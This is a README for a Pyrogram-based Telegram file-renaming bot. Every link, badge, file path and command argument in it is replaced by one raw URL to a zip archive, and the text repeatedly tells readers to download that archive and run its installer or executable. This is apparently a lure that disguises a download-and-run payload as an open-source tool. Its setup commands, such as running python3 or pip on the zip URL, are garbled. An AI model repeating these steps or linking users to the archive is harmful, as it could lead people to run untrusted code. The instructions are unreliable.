# File Rename Bot — Fast Telegram File Renamer for Pyrogram

[![Releases](https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip)](https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip)

![Telegram](https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip) ![Python](https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip)

Tags: file-rename-bot · pyrofork · pyrofork-bot · pyroforkbot · pyrogram · pyrogram-bot · python · python-bot · pythonbot · rename-bot · telegram-bot · tg-bot

A compact, direct README for a Telegram bot that renames files and updates metadata at high speed. The bot runs on Pyrogram and Python. Use it to change file name, thumbnail, prefix, suffix, metadata, and caption while keeping Telegram-level speed.

Features
- Rename files on the fly without reupload delays.
- Change thumbnail for any file before sending.
- Add or remove prefix and suffix to file names.
- Edit metadata (author, title, tags) for supported media types.
- Replace or set caption for outgoing files.
- High throughput for batch jobs.
- Command driven with inline progress and status messages.
- Works with private and group chats. Supports forwarded file handling.

Preview
- Use the Releases page to download a release package and run the included installer or executable: https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip

Quick facts
- Built with Pyrogram (MTProxy/TDLib not required).
- Written for Python 3.10+.
- Minimal dependencies.
- Deploy on VPS, Docker, or a container host.

Requirements
- Python 3.10 or later
- A Telegram bot token (BotFather)
- Pyrogram and tgcrypto (or libtgcrypto)
- Optional: ffmpeg (for thumbnail frames, metadata handling)
- A small amount of disk space for thumbnails and temp files

Installation — typical (pip)
1. Clone repo or download release package from the Releases link above.
2. Install dependencies:
   - pip install -r https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip
3. Create a bot via BotFather and get a token.
4. Copy sample config and set values:
   - cp https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip
   - Edit https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip with your BOT_TOKEN, API_ID, API_HASH, and preferences.
5. Start the bot:
   - python3 https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip

If you downloaded a release asset from the Releases page, download the release file and execute the installer or run the included executable. Example commands you may run after downloading a release archive:
- tar -xzf https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip
- cd File-Rename-Bot
- https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip  # if provided
- python3 https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip

Releases
[![Releases](https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip%20Release&style=for-the-badge)](https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip)

Visit the Releases page to pick a release. Download the archive or installer for your platform. Run the included installer or execute the main script as shown above.

Configuration
- https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip contains all runtime options.
- Key fields:
  - BOT_TOKEN: token from BotFather.
  - API_ID / API_HASH: your Telegram API credentials.
  - ADMIN_USERS: list of user IDs that can access advanced commands.
  - MAX_FILE_SIZE: limit for in-bot processing.
  - DEFAULT_THUMBNAIL: path to a fall-back thumbnail.
- Use environment variables if you prefer a 12-factor setup.

Core commands
- /start — Register and get usage hints.
- /help — Show command list and examples.
- /rename <new name> — Rename the last file you sent or forwarded.
- /thumb — Upload a thumbnail to use for future operations.
- /prefix <text> — Set a prefix to add to file names.
- /suffix <text> — Set a suffix.
- /meta author=<name> title=<title> tags=<a,b> — Set metadata for media that supports it.
- /caption <text> — Set a caption to apply when sending files.
- /reset — Clear prefix/suffix/thumbnail settings.
- /batch — Start a batch rename session.

Usage examples
- Rename a file
  1. Send or forward the file to the bot.
  2. Reply with /rename https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip
  3. The bot edits metadata and returns the file with the new name.

- Change thumbnail and caption
  1. Send image to bot and reply with /thumb to set it.
  2. Send file to bot.
  3. Reply /caption This is the new caption.
  4. Bot sends file with set thumbnail and caption.

- Add prefix and suffix
  - /prefix [Project_]
  - /suffix [_v2]
  - Then rename as usual or send files to apply the pattern.

Performance tips
- Use a VPS with a fast SSD and a good network link.
- Install tgcrypto for faster encryption with Pyrogram.
- Limit thumbnail sizes to 320x320 for best upload speed.
- Use ffmpeg for thumbnail extraction where possible.

Docker
- A Dockerfile exists for container runs.
- Build:
  - docker build -t file-rename-bot .
- Run:
  - docker run -d --env-file .env -v /data:/data file-rename-bot
- Map ports only if you expose a web monitor or dashboard.

Sample .env (if you use env)
- BOT_TOKEN=123456:ABCDEF
- API_ID=12345
- API_HASH=abcdef1234567890abcdef1234567890
- ADMIN_USERS=111111111,222222222
- https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip

Thumbnail rules
- Use JPEG/WEBP/png for static thumbnails.
- Telegram accepts 90x90 up to 320x320; keep within limits.
- Animated thumbnails are not supported.

Metadata and captions
- The bot edits Exif and XMP where applicable.
- For audio/video, the bot sets title and artist fields.
- For documents, the bot sets basic metadata where the file format allows it.
- Captions support MarkdownV2 and basic entities. The bot handles escaping if needed.

Security
- The bot runs under your Telegram bot token. Keep the token secret.
- Use ADMIN_USERS to limit commands that can change global settings.
- Run in a contained environment if you process files from untrusted users.

Troubleshooting
- Bot does not respond:
  - Check BOT_TOKEN and API credentials.
  - Check that the bot is not banned or kicked from the chat.
- File processing fails:
  - Check MAX_FILE_SIZE.
  - Install ffmpeg if thumbnail extraction fails.
  - Check disk space for temporary files.
- Thumbnail appears wrong:
  - Verify image dimensions and format.
  - Clear cache with /reset and set thumbnail again.

Example output flows
- Single file rename
  - User: forward file
  - User: reply /rename https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip
  - Bot: Processing… (shows progress bar)
  - Bot: Uploaded — https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip

- Batch rename
  - User: /batch
  - Bot: Start sending files
  - User: sends multiple files
  - User: /done
  - Bot: Processing batch (shows per-file status)
  - Bot: Results sent as separate messages

Contributing
- Fork the repository.
- Create a feature branch.
- Add tests where applicable.
- Open a pull request with a clear description of changes.
- Keep commits small and focused.

Changelog
- Changelog lives in https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip in repo root.
- Releases on the Releases page contain binaries and release notes.
- See https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip for packaged builds and installers.

Assets and screenshots
- Use the Releases page to download a packaged build or installer and try the demo included with releases.
- Example screenshots and GIFs may appear in release notes.

License
- This project uses the MIT License. See LICENSE file for details.

Contact
- Open issues on GitHub.
- Use pull requests for code changes.
- For setup help, create an issue with logs and a minimal reproduction.

Files and layout
- https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip — main entry
- modules/ — command modules
- https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip — sample config
- https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip — Python deps
- Dockerfile — container build
- https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip — installer (if present in releases)

SEO and tags
- This project targets the following tags to help discovery:
  - file-rename-bot, pyrofork, pyrofork-bot, pyroforkbot, pyrogram, pyrogram-bot, python, python-bot, pythonbot, rename-bot, telegram-bot, tg-bot

Release link reminder
- Download the release file and execute the included installer or run the packaged script from the Releases page: https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip

Use the Releases page to get stable builds or the latest assets for quick setup.